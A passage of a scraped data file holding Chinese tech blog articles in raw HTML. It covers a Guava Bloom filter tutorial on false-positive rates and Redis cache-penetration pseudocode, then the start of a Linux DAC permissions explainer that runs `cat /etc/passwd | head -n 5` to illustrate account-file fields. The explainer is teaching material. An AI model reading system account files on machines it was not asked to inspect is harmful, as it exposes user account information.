</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10000</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20000</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ed1152203686-22\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-23\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">list</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ed1152203686-24\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ed1152203686-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"误判的数量：\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">list</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">size</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-27\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ed1152203686-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-29\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0049 seconds] -->\r\n<p>输出结果如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93038ed8471634922\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n误判对数量：330</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed8471634922-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed8471634922-1\">误判对数量：<span class=\"crayon-cn\">330</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>如果上述代码所示，我们故意取10000个不在过滤器里的值，却还有330个被认为在过滤器里，这说明了误判率为0.03.即，在不做任何设置的情况下，默认的误判率为0.03。<br>\n下面上源码来证明：<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/7e2c12c502f40a42548913672b197171.png\" alt=\"image\"></p>\n<p>接下来我们来看一下，误判率为0.03时，底层维护的bit数组的长度如下图所示<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/b3087588fd2780c158760d1e703c351c.png\" alt=\"image\"></p>\n<p>将bloomfilter的构造方法改为</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93038ede539706584\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nprivate static BloomFilter&lt;Integer&gt; bloomFilter = BloomFilter.create(Funnels.integerFunnel(), size,0.01);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ede539706584-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93038ede539706584-1\"><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">Integer</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">create</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Funnels</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">integerFunnel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0.01</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>即，此时误判率为0.01。在这种情况下，底层维护的bit数组的长度如下图所示<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/d55492c1278a634aeea2d32c2440e379.png\" alt=\"image\"><br>\n由此可见，误判率越低，则底层维护的数组越长，占用空间越大。因此，误判率实际取值，根据服务器所能够承受的负载来决定，不是拍脑袋瞎想的。</p>\n<h4 id=\"实际使用\">3、实际使用</h4>\n<p>redis伪代码如下所示</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93038ee4100198374\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nString get(String key) {  \r\n   String value = redis.get(key);  \r\n   if (value  == null) {  \r\n        if(!bloomfilter.mightContain(key)){\r\n            return null;\r\n        }else{\r\n           value = db.get(key);  \r\n           redis.set(key, value);  \r\n        }\r\n    } \r\n    return value；\r\n} </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ee4100198374-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ee4100198374-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ee4100198374-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ee4100198374-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ee4100198374-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ee4100198374-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ee4100198374-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ee4100198374-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ee4100198374-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ee4100198374-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ee4100198374-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ee4100198374-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93038ee4100198374-1\"><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ee4100198374-2\"><span class=\"crayon-h\">   </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ee4100198374-3\"><span class=\"crayon-h\">   </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">value</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ee4100198374-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">bloomfilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ee4100198374-5\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ee4100198374-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span><span class=\"crayon-st\">else</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ee4100198374-7\"><span class=\"crayon-h\">           </span><span class=\"crayon-v\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">db</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ee4100198374-8\"><span class=\"crayon-h\">           </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ee4100198374-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ee4100198374-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ee4100198374-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">value</span>；</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ee4100198374-12\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p><strong>优点:</strong></p>\n<ol>\n<li>思路简单</li>\n<li>保证一致性</li>\n<li>性能强</li>\n</ol>\n<p><strong>缺点</strong></p>\n<ol>\n<li>代码复杂度增大</li>\n<li>需要另外维护一个集合来存放缓存的Key</li>\n<li>布隆过滤器不支持删值操作</li>\n</ol>\n<h2 id=\"总结\">总结</h2>\n<p>在总结部分，来个漫画把。希望对大家找工作有帮助<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/ef43eacdd2710eff0fbe24e391486c82.png\" alt=\"image\"></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114012\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114012votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114012\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,分布式,数据库", "url": "http://blog.jobbole.com/114012/", "url_obj_id": "06b67f2d6e9b1c6772e9dc3273786a32"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "Linux 权限控制的基本原理", "create_date": "2018/06/13 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"\">本文来自作者（吕凯）的推荐</a>   </div><p>这里，我们主要介绍 <code>Linux</code> 系统中，权限控制的基本原理。</p>\n<h2>安全模型<a id=\"orgheadline1\"></a></h2>\n<p>在 <code>Linux</code> 系统中，我们所有的操作实质都是在进行进程访问文件的操作。我们访问文件需要先取得相应的访问权限，而访问权限是通过 <code>Linux</code> 系统中的安全模型获得的。</p>\n<p>对于 <code>Linux</code> 系统中的安全模型，我们需要知道下面两点</p>\n<ol>\n<li><code>Linux</code> 系统上最初的安全模型叫 <code>DAC</code>, 全称是 <code>Discretionary Access Control</code> ，翻译为自主访问控制。</li>\n<li>后来又增加设计了一个新的安全模型叫 <code>MAC</code>, 全称是 <code>Mandatory Access Control</code>, 翻译为强制访问控制。</li>\n</ol>\n<p>注意, <code>MAC</code> 和 <code>DAC</code> 不是互斥的， <code>DAC</code> 是最基本的安全模型，也是通常我们最常用到的访问控制机制是 <code>Linux</code> 必须具有的功能， 而 <code>MAC</code> 是构建在 <code>DAC</code> 之上的加强安全机制，属于可选模块。访问前， Linux系统通常都是先做 <code>DAC</code> 检查， 如果没有通过则操作直接失败; 如果通过 <code>DAC</code> 检查并且系统支持 <code>MAC</code> 模块，再做 <code>MAC</code> 权限检查。</p>\n<p>为区分两者，我们将支持 <code>MAC</code> 的 <code>Linux</code> 系统称作 <code>SELinux</code>, 表示它是针对 <code>Linux</code> 的安全加强系统。</p>\n<p>这里，我们将讲述 <code>Linux</code> 系统中的 <code>DAC</code> 安全模型。</p>\n<h2><code>DAC</code> 安全模型<a id=\"orgheadline22\"></a></h2>\n<p><code>DAC</code> 的核心内容是：在 <code>Linux</code> 中，进程理论上所拥有的权限与执行它的用户的权限相同。其中涉及的一切内容，都是围绕这个核心进行的。</p>\n<h3>用户和组ID信息控制<a id=\"orgheadline4\"></a></h3>\n<h4>用户、组、口令信息<a id=\"orgheadline2\"></a></h4>\n<p>通过 <code>/etc/passwd</code> 和 <code>/etc/group</code> 保存用户和组信息，通过 <code>/etc/shadow</code> 保存密码口令及其变动信息， 每行一条记录。</p>\n<p>用户和组分别用 <code>UID</code> 和 <code>GID</code> 表示，一个用户可以同时属于多个组，默认每个用户必属于一个与之 <code>UID</code> 同值同名的 <code>GID</code> 。</p>\n<p>对于 <code>/etc/passwd</code> , 每条记录字段分别为 <code>用户名:口令（在 /etc/shadow 加密保存）：UID:GID（默认UID）:描述注释:主目录:登录shell(第一个运行的程序)</code></p>\n<p>对于 <code>/etc/group</code> ， 每条记录字段分别为 <code>组名：口令（一般不存在组口令）：GID：组成员用户列表（逗号分割的用户UID列表）</code></p>\n<p>对于 <code>/etc/shadow</code> ，每条记录字段分别为： <code>登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:</code></p>\n<h4>举例<a id=\"orgheadline3\"></a></h4>\n<p>以下是对用户和组信息的举例。 <code>/etc/shadow</code> 中的口令信息为加密存储，不举例。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92874b3b8285193957\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$cat /etc/passwd |head -n 5\r\nroot:x:0:0:root:/root:/bin/bash\r\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\r\nbin:x:2:2:bin:/bin:/bin/sh\r\nsys:x:3:3:sys:/dev:/bin/sh\r\nsync:x:4:65534:sync:/bin:/bin/sync\r\n\r\n$cat /etc/group |head -n 5\r\nroot:x:0:\r\ndaemon:x:1:\r\nbin:x:2:\r\nsys:x:3:\r\nadm:x:4:miracle</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3b8285193957-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3b8285193957-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3b8285193957-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3b8285193957-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3b8285193957-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3b8285193957-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3b8285193957-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3b8285193957-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3b8285193957-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3b8285193957-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3b8285193957-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3b8285193957-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3b8285193957-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92874b3b8285193957-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">passwd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">head</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3b8285193957-2\"><span class=\"crayon-v\">root</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">root</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">root</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">bash</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3b8285193957-3\"><span class=\"crayon-v\">daemon</span><span 